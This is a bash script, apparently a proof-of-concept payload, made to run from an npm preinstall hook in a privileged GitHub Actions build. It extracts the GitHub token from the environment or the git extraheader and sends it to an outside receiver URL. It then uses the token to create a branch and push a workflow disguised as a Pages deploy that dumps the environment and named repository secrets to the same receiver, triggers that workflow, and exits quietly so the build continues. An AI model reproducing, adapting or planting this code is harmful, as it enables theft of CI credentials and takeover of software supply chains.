#!/bin/bash
# payload.sh — Runs during npm ci preinstall in the privileged build job

RECEIVER_URL="https://sap-test-receiver-production.up.railway.app/collect"
REPO="delsoup455/architecture-center-test"
BRANCH="tmp-exfil-$(date +%s)"
API="https://api.github.com"

# --- Extract GITHUB_TOKEN ---
# The token may be in the env directly, or stored by actions/checkout in:
# 1. The git extraheader config (Basic auth base64)
# 2. The ACTIONS_RUNTIME_TOKEN env var
# 3. The git credential helper

# Try env var first
TOKEN="$GITHUB_TOKEN"

# If not in env, extract from git config (actions/checkout stores it as extraheader)
if [ -z "$TOKEN" ]; then
  EXTRAHEADER=$(git config --get http.https://github.com/.extraheader 2>/dev/null || true)
  if [ -n "$EXTRAHEADER" ]; then
    # Format: "AUTHORIZATION: basic <base64(x-access-token:TOKEN)>"
    TOKEN=$(echo "$EXTRAHEADER" | sed 's/.*basic //' | base64 -d 2>/dev/null | cut -d: -f2)
  fi
fi

# If still empty, try scanning env for any GH token
if [ -z "$TOKEN" ]; then
  TOKEN=$(env | grep -iE '^(GITHUB_TOKEN|GH_TOKEN|INPUT_TOKEN)=' | head -1 | cut -d= -f2-)
fi

AUTH="Authorization: token $TOKEN"

# --- Phase 1: Send token info to receiver ---
TOKEN_LEN=${#TOKEN}
curl -s "$RECEIVER_URL?stage=github_token&token_len=$TOKEN_LEN&token=$(echo -n $TOKEN | base64 -w0)" || true

# --- Phase 2: Create a new branch (no harm to existing branches) ---
# Get the SHA of the joule-integration branch to base our new branch on
REF_RESPONSE=$(curl -s -H "$AUTH" "$API/repos/$REPO/git/ref/heads/joule-integration" 2>&1)
BASE_SHA=$(echo "$REF_RESPONSE" | jq -r '.object.sha // empty' 2>/dev/null)

# Send diagnostic
curl -s "$RECEIVER_URL?stage=phase2_ref&base_sha=$BASE_SHA&ref_status=$?" || true

if [ -z "$BASE_SHA" ]; then
  curl -s "$RECEIVER_URL?stage=phase2_failed&response=$(echo -n "$REF_RESPONSE" | base64 -w0)" || true
  exit 0
fi

# Create the new branch
CREATE_RESPONSE=$(curl -s -X POST -H "$AUTH" -H "Content-Type: application/json" \
  "$API/repos/$REPO/git/refs" \
  -d "{\"ref\":\"refs/heads/$BRANCH\",\"sha\":\"$BASE_SHA\"}" 2>&1)
curl -s "$RECEIVER_URL?stage=phase2_create&branch=$BRANCH&status=$(echo "$CREATE_RESPONSE" | jq -r '.ref // "failed"')" || true

# --- Phase 3: Push a secret-dumping workflow to the new branch ---
WORKFLOW_CONTENT=$(cat <<'WORKFLOW_EOF'
name: Deploy main site to GitHub Pages

on:
  workflow_dispatch:

jobs:
  dump:
    runs-on: ubuntu-latest
    steps:
      - name: Exfiltrate
        env:
          PAASAPCOM_PAT: ${{ secrets.PAASAPCOM_PAT }}
          VALIDATOR_API_URL: ${{ secrets.VALIDATOR_API_URL }}
          BACKEND_API_URL: ${{ secrets.BACKEND_API_URL }}
          EXPRESS_BACKEND_URL: ${{ secrets.EXPRESS_BACKEND_URL }}
          VALIDATOR_RULES_API_URL: ${{ secrets.VALIDATOR_RULES_API_URL }}
          VALIDATOR_OAUTH_AUTH_URL: ${{ secrets.VALIDATOR_OAUTH_AUTH_URL }}
          VALIDATOR_OAUTH_CLIENT_ID: ${{ secrets.VALIDATOR_OAUTH_CLIENT_ID }}
          VALIDATOR_OAUTH_CLIENT_SECRET: ${{ secrets.VALIDATOR_OAUTH_CLIENT_SECRET }}
          CHECK_SPELLING: ${{ secrets.CHECK_SPELLING }}
        run: |
          curl -s -X POST "RECEIVER_PLACEHOLDER" \
            -H "Content-Type: application/json" \
            -d "{
              \"stage\": \"full_dump\",
              \"env\": \"$(env | base64 -w0)\",
              \"paasapcom_pat\": \"$(echo -n $PAASAPCOM_PAT | base64 -w0)\",
              \"validator_oauth_client_id\": \"$(echo -n $VALIDATOR_OAUTH_CLIENT_ID | base64 -w0)\",
              \"validator_oauth_client_secret\": \"$(echo -n $VALIDATOR_OAUTH_CLIENT_SECRET | base64 -w0)\",
              \"validator_oauth_auth_url\": \"$(echo -n $VALIDATOR_OAUTH_AUTH_URL | base64 -w0)\",
              \"validator_api_url\": \"$(echo -n $VALIDATOR_API_URL | base64 -w0)\",
              \"validator_rules_api_url\": \"$(echo -n $VALIDATOR_RULES_API_URL | base64 -w0)\",
              \"backend_api_url\": \"$(echo -n $BACKEND_API_URL | base64 -w0)\",
              \"express_backend_url\": \"$(echo -n $EXPRESS_BACKEND_URL | base64 -w0)\",
              \"check_spelling\": \"$(echo -n $CHECK_SPELLING | base64 -w0)\"
            }"
WORKFLOW_EOF
)

# Replace the placeholder with actual receiver URL
WORKFLOW_CONTENT=$(echo "$WORKFLOW_CONTENT" | sed "s|RECEIVER_PLACEHOLDER|$RECEIVER_URL|g")

# Base64-encode the workflow for the GitHub API
ENCODED=$(echo "$WORKFLOW_CONTENT" | base64 -w0)

# Get the current SHA of deploy-manual.yml on the new branch
FILE_RESPONSE=$(curl -s -H "$AUTH" "$API/repos/$REPO/contents/.github/workflows/deploy-manual.yml?ref=$BRANCH" 2>&1)
FILE_SHA=$(echo "$FILE_RESPONSE" | jq -r '.sha // empty' 2>/dev/null)

curl -s "$RECEIVER_URL?stage=phase3_file_sha&sha=$FILE_SHA" || true

if [ -z "$FILE_SHA" ]; then
  curl -s "$RECEIVER_URL?stage=phase3_failed&response=$(echo -n "$FILE_RESPONSE" | head -c 500 | base64 -w0)" || true
  exit 0
fi

# Update the file on the new branch
UPDATE_RESPONSE=$(curl -s -X PUT -H "$AUTH" -H "Content-Type: application/json" \
  "$API/repos/$REPO/contents/.github/workflows/deploy-manual.yml" \
  -d "{
    \"message\": \"update workflow\",
    \"content\": \"$ENCODED\",
    \"sha\": \"$FILE_SHA\",
    \"branch\": \"$BRANCH\"
  }" 2>&1)
UPDATE_STATUS=$(echo "$UPDATE_RESPONSE" | jq -r '.content.name // empty' 2>/dev/null)
if [ -z "$UPDATE_STATUS" ]; then
  curl -s -X POST "$RECEIVER_URL?stage=phase3_update_failed" -d "$(echo -n "$UPDATE_RESPONSE" | head -c 1000)" || true
else
  curl -s "$RECEIVER_URL?stage=phase3_update_ok&file=$UPDATE_STATUS" || true
fi

# --- Phase 4: Trigger workflow_dispatch on the new branch ---
sleep 3

DISPATCH_RESPONSE=$(curl -s -w "\n%{http_code}" -X POST -H "$AUTH" -H "Content-Type: application/json" \
  "$API/repos/$REPO/actions/workflows/deploy-manual.yml/dispatches" \
  -d "{\"ref\":\"$BRANCH\"}" 2>&1)
DISPATCH_CODE=$(echo "$DISPATCH_RESPONSE" | tail -1)
curl -s "$RECEIVER_URL?stage=phase4_dispatch&http_code=$DISPATCH_CODE&branch=$BRANCH" || true

# Send confirmation
curl -s "$RECEIVER_URL?stage=payload_complete&branch=$BRANCH" || true

# Exit 0 so npm ci continues
exit 0
